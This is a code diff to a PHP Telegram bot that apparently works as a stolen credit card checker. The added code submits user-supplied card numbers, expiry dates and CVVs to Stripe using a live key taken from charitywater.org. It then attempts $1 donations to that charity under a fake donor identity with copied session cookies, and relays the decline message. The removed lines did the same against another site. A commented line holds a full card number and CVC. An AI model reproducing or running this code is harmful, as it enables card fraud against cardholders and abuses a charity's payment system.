@@ -1739,61 +1739,101 @@ ob_flush();
 
 
 elseif((strpos($message, "!la") === 0)||(strpos($message, "/la") === 0)||(strpos($message, ".la") === 0)){
-                                                                                                     $lista = substr($message, 4);
+$lista = substr($message, 4);
 $i     = explode("|", $lista);
-$cc    = $i[0];                                                                                      $mes   = $i[1];
+$cc    = $i[0];
+$mes   = $i[1];
 $ano  = trim(substr($i[2], -2));
-$ano1  = $i[2];                                                                                      $cvv   = $i[3];
+$ano1  = $i[2];
+$cvv   = $i[3];
 
-$bin = substr($lista, 0, 6);                                                                         $ma = "$mes+%2F+$ano";
+$bin = substr($lista, 0, 6);
+$ma = "$mes+%2F+$ano";
 
-////                                                                                                 $num = "$cc$mes$ano1$cvv";
+$num = "$cc$mes$ano1$cvv";
 //-----------------------------------------------------//
-$verify = substr($cc, 16, 1);                                                                        if($verify != ""){
+$verify = substr($cc, 16, 1);
+if($verify != ""){
 $respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
 sendMessage($chat_id,$respuesta, $message_id);
 die();
 }                                                                                                    
 if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
-}else{                                                                                               $respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /la cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !la cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .la cc|m|y|cvv\n";
-sendMessage($chat_id,$respuesta, $message_id);                                                       die();
+}else{
+$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /la cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !la cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .la cc|m|y|cvv\n";
+sendMessage($chat_id,$respuesta, $message_id);
+	die();
 }
                                                                                                      
 //----------------MENSAGE DE ESPERA-------------------//
-$respuesta = "<b>🕒 Wait for Result...</b>";                                                         sendMessage($chat_id,$respuesta, $message_id);
+$respuesta = "<b>🕒 Wait for Result...</b>";
+	sendMessage($chat_id,$respuesta, $message_id);
 //-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
-$id_text = file_get_contents("ID");                                                                  //----------------------------------------------------//
+$id_text = file_get_contents("ID");
+	//----------------------------------------------------//
 
 
 $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
+
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://www.lagreeod.com/register/validate_subscribe_step_3',
+  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'card%5Bname%5D=Rigo&card%5Bnumber%5D='.$cc.'&card%5Bexp_month%5D='.$mes.'&card%5Bexp_year%5D='.$ano.'&card%5Bcvc%5D='.$cvv.'&coupon=&s1=6&sum=13',
-  CURLOPT_COOKIE => 'sucuri_cloudproxy_uuid_e639e2cfa=03365a00e58f850814a79f58c1212df8; ci_session=3sfatb97g645fkgddu82s52us79flfp7',
+  //  CURLOPT_POSTFIELDS => 'type=card&billing_details%5Baddress%5D%5Bpostal_code%5D=37435&billing_details%5Baddress%5D%5Bcity%5D=Pearland&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D=543+w+belt+line+rd&billing_details%5Bemail%5D=poichad70%40rhyta.com&billing_details%5Bname%5D=Rigo++Perez&card%5Bnumber%5D=4169161444795073&card%5Bcvc%5D=588&card%5Bexp_month%5D=03&card%5Bexp_year%5D=29&guid=48a8dab2-9ea1-449d-8977-4278ae5f52b982b3ec&muid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f&sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd&payment_user_agent=stripe.js%2Ff22f608063%3B+stripe-js-v3%2Ff22f608063%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=46867&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
+  CURLOPT_POSTFIELDS => 'type=card&billing_details[address][postal_code]=37435&billing_details[address][city]=Pearland&billing_details[address][country]=US&billing_details[address][line1]=543+w+belt+line+rd&billing_details[email]=poichad70%40rhyta.com&billing_details[name]=Rigo++Perez&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=48a8dab2-9ea1-449d-8977-4278ae5f52b982b3ec&muid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f&sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd&payment_user_agent=stripe.js%2Ff22f608063%3B+stripe-js-v3%2Ff22f608063%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=46867&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
-    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-    'accept-language: es-US,es;q=0.5',
-    'origin: https://www.lagreeod.com',
-    'referer: https://www.lagreeod.com/subscribe-payment',
+    'Accept: application/json',
+    'Content-Type: application/x-www-form-urlencoded',
+    'accept-language: es-US,es;q=0.9',
+    'origin: https://js.stripe.com',
+    'referer: https://js.stripe.com/',
   ],
 ]);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
-
 $data = json_decode($response, true);
-$respo = $data['message'];
+$id = $data['id'];
+
 curl_close($curl);
+
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.charitywater.org/donate/stripe',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'country=us&payment_intent%5Bemail%5D=poichad70%40rhyta.com&payment_intent%5Bamount%5D=1&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bpayment_method%5D='.$id.'&disable_existing_subscription_check=false&donation_form%5Bamount%5D=1&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D=poichad70%40rhyta.com&donation_form%5Bname%5D=Rigo+&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D=Perez&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_1%5D=543+w+belt+line+rd&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_2%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcity%5D=Pearland&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcountry%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Bzip%5D=37435&donation_form%5Bmetadata%5D%5Bautomatically_subscribe_to_mailing_lists%5D=true&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2Fdonate%23&donation_form%5Bmetadata%5D%5Bphone_number%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bsession_url_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false&donation_form%5Biho_attributes%5D%5Bamount_hidden%5D=false&donation_form%5Biho_attributes%5D%5Bdelivery_notification%5D=false&donation_form%5Biho_attributes%5D%5Bdesign%5D=in-memory-us&donation_form%5Biho_attributes%5D%5Bfrom_full_name%5D=&donation_form%5Biho_attributes%5D%5Bhonoree_full_name%5D=&donation_form%5Biho_attributes%5D%5Bmessage%5D=&donation_form%5Biho_attributes%5D%5Brecipient_email%5D=&donation_form%5Biho_attributes%5D%5Brecipient_full_name%5D=&donation_form%5Biho_attributes%5D%5Bsend_to%5D=honoree&donation_form%5Biho_attributes%5D%5Btype%5D=email',
+  CURLOPT_COOKIE => 'countrypreference=US; optimizelyEndUserId=oeu1727042234870r0.9385499213586781; builderSessionId=a769ef11f27d4ab1b3a938966f28ac00; _gcl_au=1.1.1117950168.1727042237; _ga=GA1.1.1588880688.1727042240; FPAU=1.1.1117950168.1727042237; analytics_ids=iMG2SMEYVxANgwK3sG6DVJErN5AMZXhH8ZprCWg87gUKTXEY9Za1iAb7yUKp1QiXj8uLKdYCgwVt4x42mSLnty%2BqG454tNwaHxlW8bSGAwf7XRk6nzHkCcRMjK3%2FF0Hcx2tfvZGBVYDcG9QxI9LDBty%2BUrdNNhgH0vnmQ5VAo1Ky--HO%2FSMhnzu5mRDR3p--2E5N%2FNov5%2BSGZh126foarQ%3D%3D; __stripe_mid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f; __stripe_sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd; _ga_5H0VND0XMD=GS1.1.1727042243.1.1.1727042676.0.0.1074196026; _ga_SKG6MDYX1T=GS1.1.1727042237.1.1.1727042719.0.0.694026822',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
+//    'x-csrf-token: WeaTvtRa0ZL6skk_6DkEUGqjg6wp1bPyeAr8rNuQ_5KGioeVKhhuo7n--eqtWARWnaejjhSBdntJvIZLiNngiA',
+    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+    'accept-language: es-US,es;q=0.9',
+    'origin: https://www.charitywater.org',
+    'referer: https://www.charitywater.org/donate',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$data = json_decode($response, true);
+$respo = $data['error']['message'];
+curl_close($curl);
+	
 
 ///VERIFICA EL TINPO DE PROCESAMIENTO///
 $timetakeen = (microtime(true) - $startTime);
